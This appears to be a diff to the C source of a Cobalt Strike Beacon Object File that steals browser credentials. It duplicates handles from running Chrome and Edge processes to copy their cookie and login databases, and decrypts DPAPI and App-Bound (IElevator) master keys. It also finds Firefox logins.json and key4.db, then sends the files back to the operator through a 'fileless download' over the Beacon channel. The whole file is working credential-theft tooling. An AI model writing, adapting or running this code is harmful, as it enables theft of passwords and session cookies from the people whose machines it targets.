@@ -23,6 +23,7 @@ WINBASEAPI char* __cdecl  MSVCRT$strstr (char* _String, const char* _SubString);
 WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *s);
 DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strchr(const char *haystack, int needle);
 WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
+WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ _Dest,size_t _Count,const char * __restrict__ _Format,...);
 WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
 
 WINADVAPI WINBOOL WINAPI ADVAPI32$RevertToSelf();
@@ -46,8 +47,8 @@ WINBASEAPI DWORD WINAPI KERNEL32$GetFileType(HANDLE hFile);
 WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
 WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
-WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
-WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
+//WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
+//WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
 WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
 //WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
 DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
@@ -72,13 +73,21 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE h
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
 DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
 
-#define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
-    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
-    FARPROC srand = Resolver("msvcrt", "srand");\
-    FARPROC time = Resolver("msvcrt", "time");\
-    FARPROC strnlen = Resolver("msvcrt", "strnlen");\
-    FARPROC rand = Resolver("msvcrt", "rand");\
-    FARPROC realloc = Resolver("msvcrt", "realloc");
+DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
+WINBASEAPI BOOL WINAPI SHLWAPI$PathAppendA(LPCSTR pszPath, LPCSTR pszMore);
+WINBASEAPI int __cdecl MSVCRT$rand();
+WINBASEAPI void __cdecl MSVCRT$srand(int initial);
+WINBASEAPI time_t __cdecl MSVCRT$time(time_t *time);
+WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str,size_t _MaxCount);
+//WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
+
+// #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
+//     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
+//     FARPROC srand = Resolver("msvcrt", "srand");\
+//     FARPROC time = Resolver("msvcrt", "time");\
+//     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
+//     FARPROC rand = Resolver("msvcrt", "rand");\
+//     FARPROC realloc = Resolver("msvcrt", "realloc");
 #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
 #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
 #define DATA_FREE(d, l) \
@@ -87,31 +96,33 @@ DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_
         intFree(d); \
         d = NULL; \
     }
+
 #define CSIDL_LOCAL_APPDATA 0x001c
 #define CSIDL_APPDATA 0x001a
+static char* supported_browsers[] = {"chrome", "msedge", "firefox"};
 
 //workaround for no slot for function (reduce number of Win32 APIs called) 
-FARPROC Resolver(CHAR *lib, CHAR *func) {
-    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
-    return ptr;
-}
+// FARPROC Resolver(CHAR *lib, CHAR *func) {
+//     FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
+//     return ptr;
+// }
 
 CHAR *GetFileContent(CHAR *path) {
     CHAR fullPath[MAX_PATH];
     HANDLE hFile = NULL;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //get appdata local path and append path 
     if (path[0] == '\\') {
-        BeaconPrintf(CALLBACK_OUTPUT,"Appending local app data path\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"[+] Appending local app data path");
         CHAR appdata[MAX_PATH];
-        SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
-        PathAppend(appdata, path);
+        SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
+        SHLWAPI$PathAppendA(appdata, path);
         MSVCRT$strncpy(fullPath, appdata, MAX_PATH);
     } else {
         MSVCRT$strncpy(fullPath, path, MAX_PATH);
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "LOOKING FOR FILE: %s \n", fullPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] LOOKING FOR FILE: %s", fullPath);
     
     //get handle to appdata
     hFile = KERNEL32$CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -166,28 +177,38 @@ CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
 }
 
 VOID GetMasterKey(CHAR *key) {
-    BYTE *byteKey = NULL;
+    Buffer result = {0};
     DWORD dwOut = 0;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //calculate size of key
-    CRYPT32$CryptStringToBinaryA(key, MSVCRT$strlen(key), CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL);
+    if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL)) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
+        return;
+    }
     //BeaconPrintf(CALLBACK_OUTPUT,"base64 size needed is %d.\n", dwOut);
-
-    //base64 decode key
-    byteKey = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwOut);
-    CRYPT32$CryptStringToBinaryA(key, MSVCRT$strlen(key), CRYPT_STRING_BASE64, byteKey, &dwOut, NULL, NULL);  
-    byteKey += 5;
-    
+    result.data = (unsigned char*)MSVCRT$malloc(dwOut);
+    if (!result.data) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for key\n");
+        return;
+    }
+    if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, result.data, &dwOut, NULL, NULL)) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
+        return;
+    }
+    //BeaconPrintf(CALLBACK_OUTPUT,"[+] decrypted base64 %s\n", result.data);
+    if (dwOut < 5 || MSVCRT$memcmp(result.data, "DPAPI", 5) != 0) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Invalid DPAPI Prefix\n");
+        return;
+    }
     DATA_BLOB db;
     DATA_BLOB final;
-    db.pbData = byteKey;
-    db.cbData = dwOut;
+    db.pbData = result.data + 5;
+    db.cbData = dwOut - 5;
 
     //decrypt key with dpapi for current user
-    BOOL result = CRYPT32$CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final);
-    if(!result) {
-        BeaconPrintf(CALLBACK_ERROR,"Decrypting the key failed.\n");
+    if (!CRYPT32$CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final)) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] Decrypting the key failed.\n");
         return;
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Key!");
@@ -198,10 +219,9 @@ VOID GetMasterKey(CHAR *key) {
     for(i = 0; i < final.cbData; i++) {
         MSVCRT$sprintf(output, "%s\\x%02x", output, final.pbData[i]);
     }
-    BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] Master Key (v10): %s \n", output );
 
     // rewind to the start of the buffer
-    KERNEL32$GlobalFree(byteKey - 5);
     KERNEL32$GlobalFree(output);
     KERNEL32$LocalFree(final.pbData);
 }
@@ -268,7 +288,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     if (FAILED(hr)) {
     	hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
     	if (FAILED(hr)) {
-			BeaconPrintf(CALLBACK_ERROR,"CoInitializeEx failed: 0x%x\n", hr);
+			BeaconPrintf(CALLBACK_ERROR,"[!] CoInitializeEx failed: 0x%x\n", hr);
         	return;
 		}
     }
@@ -282,7 +302,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
     }
     if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to create IElevator instance.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance.\n");
         OLE32$CoUninitialize();
         return;
     }
@@ -313,7 +333,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     }
 
     if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,"Failed to set proxy blanket.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket.\n");
         OLE32$CoUninitialize();
         return;
     }
@@ -322,7 +342,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     size_t encrypted_key_len;
     uint8_t* encrypted_key_with_header = Base64Decode(key, &encrypted_key_len);
     if (MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "Invalid key header.\n");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid key header.\n");
         MSVCRT$free(encrypted_key_with_header);
         OLE32$CoUninitialize();
         return;
@@ -351,10 +371,10 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
         DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
         //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
-        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
 
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
+        BeaconPrintf(CALLBACK_ERROR, "[!] App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
     }
 
     OLEAUT32$SysFreeString(plaintext_data);
@@ -388,34 +408,31 @@ VOID GetEncryptionKey(char * browser) {
         localStatePath = "\\Google\\Chrome\\User Data\\Local State";
     }
 
-    // commented out for now, as it is not needed with the use of app bound encryption
-    // CHAR *data = GetFileContent(localStatePath);
-    // CHAR *key = NULL;
-
-    // if(data == NULL) {
-    //     BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
-    //     return;
-    // }
-    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
-    // // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
-    // CHAR pattern[] = "\"encrypted_key\":\"";
-    // key = ExtractKey(data, pattern);
-    // KERNEL32$GlobalFree(data);
-    // if(key == NULL) {
-    //     BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
-    //     return;
-    // }
-    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
-    // GetMasterKey(key);
-
+    // now we can decrypt v10 as well, as it is not needed with the use of app bound encryption
     CHAR *app_key = NULL;
+    CHAR *key = NULL;
     CHAR *app_data = GetFileContent(localStatePath);
-    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
     if(app_data == NULL) {
-        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Reading the file failed.\n");
         return;
     }
-    app_key = ExtractKey(app_data, app_pattern); 
+
+    CHAR pattern[] = "\"encrypted_key\":\"";
+    key = ExtractKey(app_data, pattern);
+
+    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
+    app_key = ExtractKey(app_data, app_pattern);
+
+    if(key != NULL) {
+        GetMasterKey(key);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,"[!] There's no v10 encryption key, checking v20...");
+    }
+    if(app_key == NULL) {
+        BeaconPrintf(CALLBACK_ERROR,"[!] No appbound encryption key available\n");
+        return;
+    }
+    //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
     }
@@ -431,17 +448,17 @@ VOID GetEncryptionKey(char * browser) {
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
     CHAR *appdata = NULL;
     CHAR *tempProfile = NULL;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
     // create temp var to hold profile
     tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MSVCRT$strlen(profile) + 1);
     MSVCRT$strncpy(tempProfile, profile, MSVCRT$strlen(profile)+1);
     appdata = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MAX_PATH + 1);
 
     //get appdata local path and append path to file
-    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
     file = MSVCRT$strncat(tempProfile, file, MSVCRT$strlen(file)+1);
-    PathAppend(appdata, "\\Mozilla\\Firefox\\Profiles");
-    PathAppend(appdata, file);
+    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\Profiles");
+    SHLWAPI$PathAppendA(appdata, file);
     KERNEL32$GlobalFree(tempProfile);
 
     return appdata;
@@ -451,18 +468,18 @@ VOID GetFirefoxInfo() {
     //get firefox key
     CHAR appdata[MAX_PATH];
     HANDLE hFile = NULL;
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
 
     //get appdata local path and append path 
-    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
-    PathAppend(appdata, "\\Mozilla\\Firefox\\profiles.ini");
+    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\profiles.ini");
     //BeaconPrintf(CALLBACK_OUTPUT,"Firefox profile info be at: %s \n", appdata );
 
     //get handle to appdata
     hFile = KERNEL32$CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if(hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR,"File not found at: %s \n", appdata);
-        BeaconPrintf(CALLBACK_ERROR,"Firefox not found on host\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] File not found at: %s \n", appdata);
+        BeaconPrintf(CALLBACK_ERROR,"[!] Firefox not found on host\n");
         return;
     }
     
@@ -475,7 +492,7 @@ VOID GetFirefoxInfo() {
     buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
     KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
     if(dwSize != dwRead) {
-        BeaconPrintf(CALLBACK_ERROR,"file size mismatch.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] file size mismatch.\n");
     }
     KERNEL32$CloseHandle(hFile);
     
@@ -503,7 +520,7 @@ VOID GetFirefoxInfo() {
     profile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
     MSVCRT$strncpy(profile, buffer, dwSize);
 
-    BeaconPrintf(CALLBACK_OUTPUT,"Firefox Default Profile: %s \n", profile );
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] Firefox Default Profile: %s \n", profile );
 
     // get path to logins.json
     CHAR *logins = NULL;
@@ -513,11 +530,11 @@ VOID GetFirefoxInfo() {
     //check if logins.json exists
     hFile = KERNEL32$CreateFileA(logins, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if(hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR,"File not found at: %s \n", logins);
+        BeaconPrintf(CALLBACK_ERROR,"[!] File not found at: %s \n", logins);
         return;
     }
     else{
-        BeaconPrintf(CALLBACK_OUTPUT,"Firefox Stored Credentials found at: %s \n", logins);
+        BeaconPrintf(CALLBACK_OUTPUT,"[+] Firefox Stored Credentials found at: %s \n", logins);
         DWORD dwRead = 0;
         DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
         CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
@@ -534,11 +551,11 @@ VOID GetFirefoxInfo() {
     //check if key4.db exists
     hFile = KERNEL32$CreateFileA(database, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if(hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR,"File not found at: %s \n", database);
+        BeaconPrintf(CALLBACK_ERROR,"[!] File not found at: %s \n", database);
         return;
     }
     else{
-        BeaconPrintf(CALLBACK_OUTPUT,"Firefox Database found at: %s \n", database);
+        BeaconPrintf(CALLBACK_OUTPUT,"[+] Firefox Database found at: %s \n", database);
         DWORD dwRead = 0;
         DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
         CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
@@ -550,7 +567,7 @@ VOID GetFirefoxInfo() {
 
 }
 
-VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath) {
+VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPath) {
     //get handle to all processes
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
@@ -558,23 +575,19 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
     BOOL databaseStatus = FALSE;
     BOOL passwordStatus = FALSE;
     // if cookie only
-    if (cookie == 1 && loginData == 0) {
-        //then dont check for password data
+    if (cookie && !loginData) {
         passwordStatus = TRUE;
-    }
-    // if login data only
-    if (loginData == 1 && cookie == 0) {
-        //then dont check for cookie data
+    } else if (loginData && !cookie) { // Password only
         databaseStatus = TRUE;
     }
     pe32.dwSize = sizeof(PROCESSENTRY32);
-    
+
     char * browserProcess = "";
     char * cookieDB = "";
     char * passwordDB = "";
     char * cookiePath = "";
     char * passwordPath = "";
-    
+
     if (MSVCRT$strcmp(browser, "msedge") == 0){
         browserProcess = "msedge.exe";
         cookieDB = "EdgeCookies.db";
@@ -589,36 +602,41 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
         cookiePath = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
         passwordPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
     }
-    
-    
+
+
     //iterate through each handle to find browser process
-    BeaconPrintf(CALLBACK_OUTPUT, "Looking for %s Data \n", browser);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Looking for %s Data \n", browser);
     if(KERNEL32$Process32First(hSnap, &pe32)) {
         do {
             //BeaconPrintf(CALLBACK_OUTPUT, "Process: %s\n", pe32.szExeFile);
-            if(MSVCRT$strcmp(pe32.szExeFile, browserProcess) == 0) 
+            if(MSVCRT$strcmp(pe32.szExeFile, browserProcess) == 0)
             {
                 //edge was found, get cookies database
                 processCount++;
-                if (databaseStatus == FALSE){
+                if (!databaseStatus){
                     if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", cookieDB, folderPath)){
                         databaseStatus = TRUE;
+                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Cookies database found for PID %u", pe32.th32ProcessID);
                     }
                 }
-                if (passwordStatus == FALSE){
+                if (!passwordStatus){
                     if (GetBrowserFile(pe32.th32ProcessID, "Login Data", passwordDB, folderPath)){
                         passwordStatus = TRUE;
+                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Login data found for PID %u", pe32.th32ProcessID);
                     }
+                }
+                // Early exit if both files are found
+                if (databaseStatus && passwordStatus) {
+                    break;
                 }
             }
         } while(KERNEL32$Process32Next(hSnap, &pe32));
-        if (databaseStatus == FALSE){
-            BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO COOKIES WAS FOUND \n");
+        if (!databaseStatus && cookie) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to locate cookies database for %s", browser);
         }
-        if (passwordStatus == FALSE){
-            BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO LOGIN DATA WAS FOUND \n");
+        if (!passwordStatus && loginData) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to locate login data for %s", browser);
         }
-        
     }
     KERNEL32$CloseHandle(hSnap);
     //check if process was running
@@ -635,7 +653,7 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
             CHAR cookieFilePath[MAX_PATH];
             MSVCRT$sprintf(cookieFilePath, "%s\\%s", folderPath, cookieDB);
             HANDLE hFile = KERNEL32$CreateFileA(cookieFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            
+
             if (hFile == INVALID_HANDLE_VALUE) {
                 BeaconPrintf(CALLBACK_ERROR, "Failed to write cookie file to %s\n", cookieFilePath);
             } else {
@@ -644,7 +662,7 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
                 BeaconPrintf(CALLBACK_OUTPUT, "Wrote cookie file to: %s\n", cookieFilePath);
                 KERNEL32$CloseHandle(hFile);
             }
-            
+
         } else {
             download_file(cookieDB,data, sizeof(data));
         }
@@ -678,7 +696,7 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
 }
 
 BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
-    IMPORT_RESOLVE;
+    //IMPORT_RESOLVE;
     
     //BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
     //BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);
@@ -768,12 +786,12 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                         //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
                         if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
 
-                            BeaconPrintf(CALLBACK_OUTPUT,"Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
+                            BeaconPrintf(CALLBACK_OUTPUT,"[+] Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
                             //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
                             KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                             DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
-                            BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
+                            BeaconPrintf(CALLBACK_OUTPUT,"[+] file size is %d\n", dwFileSize);
                             DWORD dwRead = 0;
                             CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                             KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
@@ -785,11 +803,11 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                                 HANDLE hFile = KERNEL32$CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                     
                                 if (hFile == INVALID_HANDLE_VALUE) {
-                                    BeaconPrintf(CALLBACK_ERROR, "Failed to write password file to %s\n", copyFilePath);
+                                    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write password file to %s\n", copyFilePath);
                                 } else {
                                     DWORD written = 0;
                                     KERNEL32$WriteFile(hFile, buffer, dwFileSize, &written, NULL);
-                                    BeaconPrintf(CALLBACK_OUTPUT, "Wrote password file to: %s\n", copyFilePath);
+                                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote password file to: %s\n", copyFilePath);
                                     KERNEL32$CloseHandle(hFile);
                                 }
                             } else {
@@ -818,25 +836,25 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
 // nanodump fileless download
 BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength)
 {
-    IMPORT_RESOLVE;
-    int fileNameLength = strnlen(fileName, 256);
+    //IMPORT_RESOLVE;
+    int fileNameLength = MSVCRT$strnlen(fileName, 256);
 
     // intializes the random number generator
     time_t t;
-    srand((unsigned) time(&t));
+    MSVCRT$srand((unsigned) MSVCRT$time(&t));
 
     // generate a 4 byte random id, rand max value is 0x7fff
     ULONG32 fileId = 0;
-    fileId |= (rand() & 0x7FFF) << 0x11;
-    fileId |= (rand() & 0x7FFF) << 0x02;
-    fileId |= (rand() & 0x0003) << 0x00;
+    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
+    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
+    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;
 
     // 8 bytes for fileId and fileLength
     int messageLength = 8 + fileNameLength;
     char* packedData = intAlloc(messageLength);
     if (!packedData)
     {
-        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory for the file. Last Error %d", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not allocate memory for the file. Last Error %d", KERNEL32$GetLastError());
         return FALSE;
     }
 
@@ -867,7 +885,7 @@ BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLengt
     char* packedChunk = intAlloc(chunkLength);
     if (!packedChunk)
     {
-        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory for the file. Last Error %d", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] Could not allocate memory for the file. Last Error %d", KERNEL32$GetLastError());
         return FALSE;
     }
     // the fileId is the same for all chunks
@@ -905,7 +923,7 @@ BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLengt
         CALLBACK_FILE_CLOSE,
         packedClose,
         4);
-    BeaconPrintf(CALLBACK_OUTPUT,"The file was downloaded filessly");
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] The file was downloaded filessly");
     return TRUE;
 }
 
@@ -957,7 +975,7 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     LPCWSTR provider_name = L"Microsoft Software Key Storage Provider";
     status = NCRYPT$NCryptOpenStorageProvider(&hProvider, provider_name, 0);
     if (status != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR,"NCryptOpenStorageProvider failed with status 0x%08X\n", status);
+        BeaconPrintf(CALLBACK_ERROR,"[!] NCryptOpenStorageProvider failed with status 0x%08X\n", status);
         return NULL;
     }
     
@@ -965,7 +983,7 @@ BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_s
     LPCWSTR key_name = L"Google Chromekey1";
